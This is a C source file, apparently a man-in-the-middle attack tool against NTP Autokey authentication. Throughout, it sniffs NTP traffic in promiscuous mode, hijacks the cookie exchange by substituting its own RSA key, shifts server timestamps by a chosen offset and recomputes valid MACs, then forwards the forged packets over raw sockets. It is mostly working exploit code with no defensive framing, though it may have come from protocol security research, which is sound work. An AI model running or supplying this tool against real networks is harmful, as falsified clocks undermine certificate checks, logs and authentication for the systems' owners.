#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/md5.h>
#include <openssl/err.h>

#define SNAP_LEN 65535
#define BUF_SIZE 2048

#define NTP_PKTLEN_NOMAC (12 * sizeof(uint32_t))
#define NTP_MACLEN_NAK (1 * sizeof(uint32_t))
#define NTP_MACLEN_MD5 (5 * sizeof(uint32_t))
#define NTP_MACLEN_SHA (6 * sizeof(uint32_t))
#define NTP_MACLEN_MIN NTP_MACLEN_NAK
#define NTP_MACLEN_MAX NTP_MACLEN_SHA

#define RET_DROP 0
#define RET_FORWARD 1
#define RET_CRYPTO_NAK 2
#define RET_ERROR (-1)

#define MODE_MASK (0x7)
#define MODE_CLIENT (0x3)
#define MODE_SERVER (0x4)

#define EXT_MODE_COOKIE (0x3)

#define NTP_IP_PROTO 17
#define NTP_SERVER_PORT 123

/* ntp typedefs */
typedef struct {
	union {
		uint32_t Xl_ui;
		int32_t Xl_i;
	} Ul_i;
	union {
		uint32_t Xl_uf;
		int32_t Xl_f;
	} Ul_f;
} l_fp;
typedef uint32_t u_fp;

struct ntppkt {
	unsigned char	li_vn_mode;	/* peer leap indicator */
	unsigned char	stratum;	/* peer stratum */
	unsigned char	ppoll;		/* peer poll interval */
	signed char		precision;	/* peer clock precision */
	u_fp			rootdelay;	/* roundtrip delay to primary source */
	u_fp			rootdisp;	/* dispersion to primary source*/
	uint32_t		refid;		/* reference id */
	l_fp			reftime;	/* last update time */
	l_fp		 	org;		/* originate time stamp */
	l_fp		 	rec;		/* receive time stamp */
	l_fp		 	xmt;		/* transmit time stamp */
};

struct ntpext {
	unsigned char flags;
	unsigned char opcode;
	uint16_t ext_len;
	uint32_t assoc;
	u_fp timestamp;
	u_fp filestamp;
	uint32_t vallen;
	unsigned char val[];
};

struct cookie_list{
	uint32_t s_addr;
	uint32_t d_addr;
	uint32_t cookie;
	struct cookie_list *next;
} cookies = {0};

/* forward declarations */
void packet_handler(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes);
void forward(const unsigned char *buf, int len);
int process_ntp_packet(unsigned char *buf, int length, uint32_t s_addr, uint32_t d_addr);
void send_cookie_request(uint32_t s_addr, uint32_t d_addr, const unsigned char *buf, int len, int mac_offset);
int process_cookie_response(const unsigned char *buf, int length, uint32_t s_addr, uint32_t d_addr);
int write_mac(unsigned char *buf, int mac_offset, int mac_len, int has_ext, uint32_t s_addr, uint32_t d_addr);
void change_time(struct ntppkt *ntp_pkt, int offset);
void print_usage(char *prog_name);
int read_rsa_key(const char *keyfile);
int send_payload(const unsigned char *buf, int len, uint32_t s_addr, uint32_t d_addr, uint16_t src_port, uint16_t dst_port);
uint32_t get_cookie(uint32_t s_addr, uint32_t d_addr);
void add_cookie(uint32_t s_addr, uint32_t d_addr, uint32_t cookie);
void calc_autokey(unsigned char *key_buf, uint32_t s_addr, uint32_t d_addr, uint32_t key_id, uint32_t cookie);
int calc_maclen(const unsigned char *buf, int length, int *ext_count);

static int time_offset = 0;
static RSA *rsa = NULL;

int main(int argc, char **argv){
	const char *cap_if = "br0";
	pcap_t *pcap_handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	int fd;
	struct ifreq ifr;
	char if_addr[18];
	char capture_filter[256];
	struct bpf_program bpf;
	int ret;
	int off;

	/* OpenSSL init */
	ERR_load_crypto_strings();
	OpenSSL_add_all_algorithms();

	if(argc < 2){
		print_usage(argv[0]);
		return EXIT_FAILURE;
	}
	cap_if = argv[1];
	if(argc >= 3){
		if((off = atoi(argv[2])) != 0){
			time_offset = off;
		}
	}

	if(argc >= 4){
		if(read_rsa_key(argv[3]) != 0){
			printf("Error: could not read the rsa keyfile %s.\n", argv[3]);
			return EXIT_FAILURE;
		}
	} else {
		/* generate RSA Keypair */
		printf("Generating RSA keypair..");
		if((rsa = RSA_generate_key(512, 3, NULL, NULL)) == NULL){
			puts("failed.");
			return EXIT_FAILURE;
		}
		puts("done.");
	}


	pcap_handle = pcap_create(cap_if, errbuf);
	if(!pcap_handle){
		fprintf(stderr, "cap_create: %s\n", errbuf);
		return EXIT_FAILURE;
	}

	pcap_set_promisc(pcap_handle, 1);
	pcap_set_snaplen(pcap_handle, SNAP_LEN);

	/* get the interface mac address */
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, cap_if, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	close(fd);
	snprintf(if_addr, sizeof(if_addr), "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
		(unsigned char)ifr.ifr_hwaddr.sa_data[0],
		(unsigned char)ifr.ifr_hwaddr.sa_data[1],
		(unsigned char)ifr.ifr_hwaddr.sa_data[2],
		(unsigned char)ifr.ifr_hwaddr.sa_data[3],
		(unsigned char)ifr.ifr_hwaddr.sa_data[4],
		(unsigned char)ifr.ifr_hwaddr.sa_data[5]);
	
	snprintf(capture_filter, sizeof(capture_filter), 
			"udp port 123 and not ether src %s", if_addr);

	if((ret = pcap_activate(pcap_handle)) == PCAP_WARNING_PROMISC_NOTSUP || ret == PCAP_WARNING){
		fputs("pcap_activate: warning.\n", stderr);
	} else if(ret != 0){
		fputs("pcap_activate: error.\n", stderr);
		return EXIT_FAILURE;
	}

	if(pcap_compile(pcap_handle, &bpf, capture_filter, 1, PCAP_NETMASK_UNKNOWN) != 0){
		pcap_perror(pcap_handle, "pcap_compile");
		return EXIT_FAILURE;
	}
	if(pcap_setfilter(pcap_handle, &bpf) < 0){
		pcap_perror(pcap_handle, "pcap_setfilter");
		return EXIT_FAILURE;
	}

	while(1){
		if(pcap_loop(pcap_handle, -1, packet_handler, NULL) < 0){
			fputs("pcap_dispatch: error.\n", stderr);
			return EXIT_FAILURE;
		}
	}

	return EXIT_SUCCESS;
}

void packet_handler(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes){
	int length = h->len;
	unsigned char TX_BUF[BUF_SIZE];
	//const struct ether_header *eth_hdr;
	struct iphdr *ip_hdr;
	struct udphdr *udp_hdr;
	const u_char *bytes_ptr = bytes;
	unsigned char *buf_ptr = TX_BUF;
	int ret;
	
	if(length < sizeof(struct ether_header) + sizeof(struct iphdr)){
		fputs("packet_handler: packet too small (1).\n", stderr);
		return;
	}

	bytes_ptr += sizeof(struct ether_header);
	length -= sizeof(struct ether_header);

	if(length < ntohs(((const struct iphdr *) bytes_ptr)->tot_len)){
		fputs("packet_handler: packet too small (2).\n", stderr);
		return;
	}
	length = ntohs(((const struct iphdr *) bytes_ptr)->tot_len);

	memcpy(TX_BUF, bytes_ptr, length);

	/* ip header */
	ip_hdr = (struct iphdr *) buf_ptr;
	buf_ptr += sizeof(*ip_hdr);
	length -= sizeof(*ip_hdr);

	/* ip options */
	if(ip_hdr->ihl > 5){
		int opt_bytes = (ip_hdr->ihl-5) * 4;
		if(length < opt_bytes){
			fputs("packet_handler: packet too small (3).\n", stderr);
			return;
		}
		buf_ptr += opt_bytes;
		length -= opt_bytes;
	}

	/* udp header */
	udp_hdr = (struct udphdr *) buf_ptr;
	if(length < ntohs(udp_hdr->len)){
		fputs("packet_handler: packet too small (4).\n", stderr);
		return;
	}
	length = ntohs(udp_hdr->len);
	buf_ptr += sizeof(*udp_hdr);
	length -= sizeof(*udp_hdr);

	if(length <= 0){
		fputs("packet_handler: packet too small (5).\n", stderr);
		return;
	}

	if((ret = process_ntp_packet(buf_ptr, length, ip_hdr->saddr, ip_hdr->daddr)) == RET_FORWARD){
		udp_hdr->check = 0;
		forward(TX_BUF, (int) (buf_ptr - TX_BUF) + length);
	} else if(ret == RET_CRYPTO_NAK){
		udp_hdr->check = 0;
		int mac_len = calc_maclen(buf_ptr, length, NULL);
		if(mac_len == RET_ERROR){
			return;
		}
		udp_hdr->len = htons(ntohs(udp_hdr->len) - (mac_len - NTP_MACLEN_NAK));
		forward(TX_BUF, (int) (buf_ptr - TX_BUF) + length - (mac_len - NTP_MACLEN_NAK));
	} else {
		fputs("processing error", stderr);
	}
}

int process_ntp_packet(unsigned char *buf, int length, uint32_t s_addr, uint32_t d_addr){
	int mac_len;
	int has_ext = 0;
	int ext_len = 0;
	struct ntppkt *ntp_pkt;
	int ret;

	if(length < sizeof(*ntp_pkt)){
		fputs("process_ntp_packet: packet too small (1).\n", stderr);
		return RET_ERROR;
	}

	/* calculate mac length while skipping possible extensions */
	mac_len = calc_maclen(buf, length, &has_ext);
	if(mac_len == RET_ERROR){
		return RET_ERROR;
	}
	printf("DEBUG: has_ext = %d.\n", has_ext);
	ext_len = length - sizeof(*ntp_pkt) - mac_len;

	ntp_pkt = (struct ntppkt *) buf;
	unsigned char mode = ntp_pkt->li_vn_mode & MODE_MASK;


	if(mode == MODE_CLIENT){
		if(has_ext){
			int ext_mode = buf[sizeof(*ntp_pkt)+1];
			if(ext_mode == EXT_MODE_COOKIE){
				/* send our own cookie request */
				send_cookie_request(s_addr, d_addr, buf, length, length - mac_len);
			}
		}
		return RET_FORWARD;
	} else if(mode != MODE_SERVER){
		fprintf(stderr, "process_ntp_packet: unhandled mode: %d.\n", mode);
		return RET_ERROR;
	}
	/* MODE_SERVER */

	if(has_ext > 1){
		fputs("process_ntp_packet: multiple extension fields not (yet) supported.\n", stderr);
		return RET_ERROR;
	}

	if(has_ext){
		int ext_mode = buf[sizeof(*ntp_pkt)+1];
		if(ext_mode == EXT_MODE_COOKIE){
			/* check if this cookie response is for us */
			if(process_cookie_response(buf+sizeof(*ntp_pkt), ext_len, s_addr, d_addr) == 0){
				return RET_DROP;
			}
		}
	}

	/* spoof the time */
	change_time(ntp_pkt, time_offset);

	/* recalculate the mac */
	if((ret = write_mac(buf, sizeof(*ntp_pkt) + ext_len, mac_len, has_ext, s_addr, d_addr)) == 0){
		return RET_FORWARD;
	} else if (ret == 1){
		fputs("DEBUG: process_ntp_packet: MAC creation failed, sending crypto NAK.\n", stderr);
		return RET_CRYPTO_NAK;
	} else {
		fputs("process_ntp_packet: MAC creation failed.\n", stderr);
		return RET_DROP;
	}
}

void forward(const unsigned char *buf, int len){
	int sock;
	struct sockaddr_in dst;

	memset(&dst, 0, sizeof(dst));
	dst.sin_family = AF_INET;
	dst.sin_addr.s_addr = ((const struct iphdr *) buf)->daddr;
	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if(sendto(sock, buf, len, 0, (struct sockaddr *) &dst, sizeof(dst)) != len){
			fputs("forward: sending failed.\n", stderr);
			return;
	} else {
			puts("DEBUG: forward: sending succeeded.");
			return;
	}
}

void send_cookie_request(uint32_t s_addr, uint32_t d_addr, const unsigned char *buf, int len, int mac_offset){
	unsigned char TX_BUF[BUF_SIZE];
	struct ntpext *ntp_ext;
	int tx_mac_offset;
	int mac_len = len - mac_offset;
	unsigned char *key_ptr;

	if(len > sizeof(TX_BUF)){
		fputs("send_cookie_request: packet too big for TX_BUF.\n", stderr);
		return;
	}

	memcpy(TX_BUF, buf, len);
	ntp_ext = (struct ntpext *) (TX_BUF + sizeof(struct ntppkt));

	int keylen = i2d_RSAPublicKey(rsa, NULL);
	if(keylen > sizeof(TX_BUF) - (int)((unsigned char *)&ntp_ext->val - TX_BUF) - 4 - mac_len){
		fputs("send_cookie_request: pubkey too big for TX_BUF.\n", stderr);
		return;
	} else if(keylen <= 0){
		fprintf(stderr, "send_cookie_request: i2d failed with %d.\n", keylen);
		return;
	}

	key_ptr = ntp_ext->val;

	i2d_RSAPublicKey(rsa, &key_ptr);

	ntp_ext->vallen = htonl(keylen);
	ntp_ext->ext_len = htons(keylen + sizeof(*ntp_ext) + 4); // +4 for the signature length
	*(uint32_t *)(TX_BUF + sizeof(struct ntppkt) + sizeof(*ntp_ext) + keylen) = 0;

	tx_mac_offset = sizeof(struct ntppkt) + ntohs(ntp_ext->ext_len);

	/* copy old autokeyid */
	memcpy(TX_BUF + tx_mac_offset, buf+mac_offset, 4);

	if(write_mac(TX_BUF, tx_mac_offset, mac_len, 1, s_addr, d_addr) == -1){
		fputs("send_cookie_request: mac creation failed.\n", stderr);
		return;
	}

	if(send_payload(TX_BUF, sizeof(struct ntppkt) + sizeof(*ntp_ext) + keylen + 4 + mac_len, s_addr, d_addr, htons(NTP_SERVER_PORT), htons(NTP_SERVER_PORT)) != 0){
		fputs("send_cookie_request: sending failed.\n", stderr);
		return;
	}
}

int send_payload(const unsigned char *buf, int len, uint32_t s_addr, uint32_t d_addr, uint16_t src_port, uint16_t dst_port){
	unsigned char ipbuf[BUF_SIZE];
	struct iphdr *ip_hdr;
	struct udphdr *udp_hdr;
	int total_len = len + sizeof(struct udphdr) + sizeof(struct iphdr);

	if(total_len > BUF_SIZE){
		fputs("send_payload: packet too big.\n", stderr);
		return -1;
	}

	ip_hdr = (struct iphdr *) ipbuf;
	udp_hdr = (struct udphdr *) (ipbuf + sizeof(*ip_hdr));

	memcpy((ipbuf + sizeof(*ip_hdr) + sizeof(*udp_hdr)), buf, len);

	ip_hdr->ihl = sizeof(*ip_hdr) / 4;
	ip_hdr->version = 4;
	ip_hdr->tos = 0xC0;
	ip_hdr->tot_len = htons(total_len);
	ip_hdr->id = htons(0);
	ip_hdr->frag_off = htons(0);
	ip_hdr->ttl = 64;
	ip_hdr->protocol = NTP_IP_PROTO;
	ip_hdr->check = htons(0);
	ip_hdr->saddr = s_addr;
	ip_hdr->daddr = d_addr;

	udp_hdr->source = src_port;
	udp_hdr->dest = dst_port;
	udp_hdr->len = htons(total_len - sizeof(*ip_hdr));
	udp_hdr->check = htons(0);

	forward(ipbuf, total_len);
	return 0;
}

int process_cookie_response(const unsigned char *buf, int length, uint32_t s_addr, uint32_t d_addr){
	struct ntpext *ntp_ext;
	int keylen = RSA_size(rsa);
	int cipher_len;
	unsigned char overflow_protection[1024];
	uint32_t cookie;

	ntp_ext = (struct ntpext *) buf;
	cipher_len = ntohl(ntp_ext->vallen);
	if(cipher_len > length - (int)((unsigned char *)&ntp_ext->val - buf)){
		fputs("process_cookie_response: invalid vallen.\n", stderr);
		return -1;
	}
	if(cipher_len != keylen){
		fprintf(stderr, "process_cookie_response: cipher_len != keylen. %d != %d.\n", cipher_len, keylen);
		return -1;
	}
	if(sizeof(overflow_protection) + 4 < keylen){
		fputs("process_cookie_response: cleartext too big.\n", stderr);
		return -1;
	}

	/* try to decrypt it */
	if(RSA_private_decrypt(keylen, ntp_ext->val, (unsigned char *)&cookie,
			rsa, RSA_PKCS1_OAEP_PADDING) != 4){
		fputs("process_cookie_response: cleartext not equals 4.\n", stderr);
		return -1;
	}

	//cookie = ntohl(cookie);

	/* remember cookie */
	add_cookie(s_addr, d_addr, cookie);

	return 0;
}

void change_time(struct ntppkt *ntp_pkt, int offset){
	ntp_pkt->reftime.Ul_i.Xl_ui = htonl(ntohl(ntp_pkt->reftime.Ul_i.Xl_ui) + offset);
	ntp_pkt->rec.Ul_i.Xl_ui = htonl(ntohl(ntp_pkt->rec.Ul_i.Xl_ui) + offset);
	ntp_pkt->xmt.Ul_i.Xl_ui = htonl(ntohl(ntp_pkt->xmt.Ul_i.Xl_ui) + offset);
	return;
}

int write_mac(unsigned char *buf, int mac_offset, int mac_len, int has_ext, uint32_t s_addr, uint32_t d_addr){
	uint32_t cookie;
	uint32_t key_id;
	unsigned char key[16];
	EVP_MD_CTX ctx;
	unsigned int len;

	if(mac_len == 0)
		return 0;

	key_id = *(uint32_t *) (buf + mac_offset);

	if(has_ext){
		/* use zero as private cookie */
		cookie = 0;
	} else {
		/* check if cookie is available */
		cookie = get_cookie(s_addr, d_addr);
		if(!cookie){
			/* send crypto NAK */
			memset(buf+mac_offset, 0, 4);
			return 1;
		}
	}

	calc_autokey(key, s_addr, d_addr, key_id, cookie);

	if(mac_len == 20){
		EVP_DigestInit(&ctx, EVP_md5());
	} else if(mac_len == 24){
		EVP_DigestInit(&ctx, EVP_sha1());
	} else {
		fprintf(stderr, "write_mac: invalid mac_len %d.\n", mac_len);
		return -1;
	}
	EVP_DigestUpdate(&ctx, key, 16);
	EVP_DigestUpdate(&ctx, buf, mac_offset);
	EVP_DigestFinal(&ctx, (buf+mac_offset+4), &len);

	return 0;
}

void print_usage(char *prog_name){
	printf("Usage: %s interface [time_offset [rsa_key_file]]\n", prog_name);
}

int read_rsa_key(const char *keyfile){
	FILE *fp;
	if((fp = fopen(keyfile, "r")) == NULL){
		return -1;
	}
	if((rsa = PEM_read_RSAPrivateKey(fp, NULL, NULL, NULL)) == NULL){
		return -1;
	}
	return 0;
}

uint32_t get_cookie(uint32_t s_addr, uint32_t d_addr){
	struct cookie_list *cookie_p = &cookies;

	while(cookie_p != NULL){
		if((cookie_p->s_addr == s_addr && cookie_p->d_addr == d_addr)
				|| (cookie_p->d_addr == s_addr && cookie_p->s_addr == d_addr)){
			return cookie_p->cookie;
		}
		cookie_p = cookie_p->next;
	}

	return 0;
}

void add_cookie(uint32_t s_addr, uint32_t d_addr, uint32_t cookie){
	struct cookie_list *cookie_p = &cookies;

	while(1){
		if((cookie_p->s_addr == s_addr && cookie_p->d_addr == d_addr)
				|| (cookie_p->d_addr == s_addr && cookie_p->s_addr == d_addr)){
			cookie_p->cookie = cookie;
			return;
		}
		
		if(cookie_p->next == NULL){
			if(cookie_p->s_addr != 0 || cookie_p->d_addr != 0 || cookie_p->cookie != 0){
				cookie_p->next = malloc(sizeof(*cookie_p->next));
				if(cookie_p->next == NULL){
					fputs("add_cookie: malloc failed!\n", stderr);
					return;
				}
				cookie_p = cookie_p->next;
			}
			cookie_p->s_addr = s_addr;
			cookie_p->d_addr = d_addr;
			cookie_p->cookie = cookie;
			return;
		}

		cookie_p = cookie_p->next;
	}
}

void calc_autokey(unsigned char *key_buf, uint32_t s_addr, uint32_t d_addr, uint32_t key_id, uint32_t cookie){
	EVP_MD_CTX ctx;
	unsigned int len;

	EVP_DigestInit(&ctx, EVP_md5());
	EVP_DigestUpdate(&ctx, &s_addr, 4);
	EVP_DigestUpdate(&ctx, &d_addr, 4);
	EVP_DigestUpdate(&ctx, &key_id, 4);
	EVP_DigestUpdate(&ctx, &cookie, 4);
	EVP_DigestFinal(&ctx, key_buf, &len);
}

int calc_maclen(const unsigned char *buf, int length, int *ext_count){
	int mac_len = length - sizeof(struct ntppkt);
	int ext_len = 0;
	if(ext_count)
		*ext_count = 0;
	while(mac_len > NTP_MACLEN_MAX){
		const struct ntpext *ntp_ext;
		int len;
		if(ext_count)
			(*ext_count)++;
		ntp_ext = (const struct ntpext *) (buf + sizeof(struct ntppkt));
		len = ntohs(ntp_ext->ext_len);
		ext_len += len;
		if(length < sizeof(struct ntppkt) + ext_len){
			fprintf(stderr, "process_ntp_packet: packet too small (2). Extlen: %d.\n", ext_len);
			return RET_ERROR;
		} else if(len % 4 != 0){
			fputs("process_ntp_packet: extension length not a multiple of 4.\n", stderr);
			return RET_ERROR;
		}
		mac_len -= len;
	}
	return mac_len;
}

